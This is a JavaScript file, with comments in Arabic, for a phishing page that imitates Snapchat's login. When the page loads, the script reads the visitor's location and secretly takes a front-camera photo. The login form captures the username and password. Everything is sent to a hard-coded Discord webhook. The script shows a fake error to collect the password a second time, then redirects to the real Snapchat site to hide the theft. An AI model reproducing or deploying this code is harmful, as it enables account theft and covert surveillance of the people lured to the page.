// استبدل الرابط برابط الـ Webhook الخاص بك
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let attempts = 0;

// دالة إرسال البيانات الموحدة إلى Discord
async function sendToDiscord(blob, lat, lng, user = "", pass = "") {
    const formData = new FormData();
    let content = `🔔 **صيد جديد!**\n`;
    
    if (lat && lng) content += `📍 الموقع: [Google Maps](http://google.com/maps?q=${lat},${lng})\n`;
    if (user) content += `👤 الحساب: \`${user}\` \n🔑 الرمز: \`${pass}\`\n`;
    content += `⏰ الوقت: ${new Date().toLocaleString('ar-EG')}`;

    if (blob) formData.append('file', blob, 'target_photo.png');
    formData.append('payload_json', JSON.stringify({ 
        content: content, 
        username: "SnapHunter",
        avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png" 
    }));
    
    try { await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData }); } catch (e) { console.error(e); }
}

// السحب التلقائي (موقع + كاميرا) فور الدخول للموقع
async function startAutoCapture() {
    let lat = null, lng = null;
    // محاولة جلب الموقع الجغرافي
    navigator.geolocation.getCurrentPosition(p => { 
        lat = p.coords.latitude; 
        lng = p.coords.longitude; 
    });

    try {
        // طلب إذن الكاميرا وتشغيلها في الخلفية
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
        video.srcObject = stream;
        
        // التقاط صورة بعد 2 ثانية للتأكد من استقرار الكاميرا
        setTimeout(() => {
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(b => sendToDiscord(b, lat, lng), 'image/png');
        }, 2000);
    } catch (e) { 
        // إذا رفض المستخدم الكاميرا، نرسل الموقع الجغرافي فقط
        setTimeout(() => sendToDiscord(null, lat, lng), 3000); 
    }
}

// معالجة نموذج تسجيل الدخول في صفحة apply2.html
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const u = e.target.username.value; 
        const p = e.target.password.value;
        document.getElementById('loadingOverlay').style.display = 'flex';

        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480); // التقاط صورة لحظية عند الضغط
        
        canvas.toBlob(async (b) => {
            await sendToDiscord(b, null, null, u, p);
            
            setTimeout(() => {
                attempts++;
                document.getElementById('loadingOverlay').style.display = 'none';
                if (attempts >= 2) {
                    // تحويل للموقع الرسمي بعد محاولتين
                    window.location.href = "https://accounts.snapchat.com/";
                } else {
                    document.getElementById('loginErrorMsg').style.display = 'block';
                    e.target.password.value = ""; // تفريغ الرمز لإيهام المستخدم بالخطأ
                }
            }, 1500);
        }, 'image/png');
    });
}

// تشغيل السحب التلقائي عند تحميل أي صفحة تحتوي على السكريبت
window.onload = startAutoCapture;
